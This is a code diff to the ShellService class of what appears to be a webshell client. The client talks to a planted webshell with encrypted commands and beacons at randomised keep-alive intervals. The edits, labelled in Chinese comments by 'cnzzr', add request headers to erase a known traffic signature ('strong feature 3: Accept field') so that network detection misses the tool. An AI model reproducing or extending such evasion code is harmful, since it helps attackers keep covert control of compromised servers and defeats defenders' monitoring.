@@ -25,12 +25,20 @@ public class ShellService {
         this.shellEntity = shellEntity2;
         this.currentUrl = shellEntity2.getString("url");
         this.currentType = shellEntity2.getString("type");
-        this.currentPassword = shellEntity2.getString("password");
+        this.currentPassword = (shellEntity2.getString("password"));
         this.currentHeaders = new HashMap();
         this.currentHeaders.put("User-Agent", userAgent);
         if (this.currentType.equals("php")) {
             this.currentHeaders.put("Content-type", "application/x-www-form-urlencoded");
         }
+        // cnzzr修改 强特征3：Accept字段
+        String userHeader = shellEntity2.getString("headers");
+        if (userHeader.indexOf("Accept") == -1) {
+            this.currentHeaders.put("Accept", "*/*");
+            this.currentHeaders.put("Accept-Language", "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7");
+        }
+        //cnzzr修改 补充缺失的请求头
+        this.currentHeaders.put("Accept-Encoding", "identity");
         mergeHeaders(this.currentHeaders, shellEntity2.getString("headers"));
 
         //返回到 ShellService 之后会获取之后会获取返回结果里面的 cookie 和 key，在之后的请求里面都会使用这个 cookie 和 key。
@@ -383,9 +391,11 @@ public class ShellService {
     }
 
     public String getBasicInfo() throws Exception {
-        String str = "";
+        String className = "BasicInfo";
         //requestAndParse 则是使用带有获取的 cookie 的请求头来 postgetData 得到的加密和编码过后的字节数组，并获取返回信息。
-        byte[] resData = (byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders, Utils.getData(this.currentKey, this.encryptType, "BasicInfo", new LinkedHashMap<>(), this.currentType), this.beginIndex, this.endIndex).get("data");
+        byte[] resData = (byte[]) Utils.requestAndParse(this.currentUrl, this.currentHeaders,
+                Utils.getData(this.currentKey, this.encryptType, className, new LinkedHashMap<>(), this.currentType),
+                this.beginIndex, this.endIndex).get("data");
         try {
             return new String(Crypt.Decrypt(resData, this.currentKey, this.encryptType, this.currentType));
         } catch (Exception e) {
@@ -396,8 +406,9 @@ public class ShellService {
 
     public void keepAlive() throws Exception {
         while (true) {
+            long sleepTime = (long) ((new Random().nextInt(5) + 5) * 60 * 1000);
             try {
-                Thread.sleep((long) ((new Random().nextInt(5) + 5) * 60 * 1000));
+                Thread.sleep(sleepTime);
                 getBasicInfo();
             } catch (Exception e) {
                 e.printStackTrace();
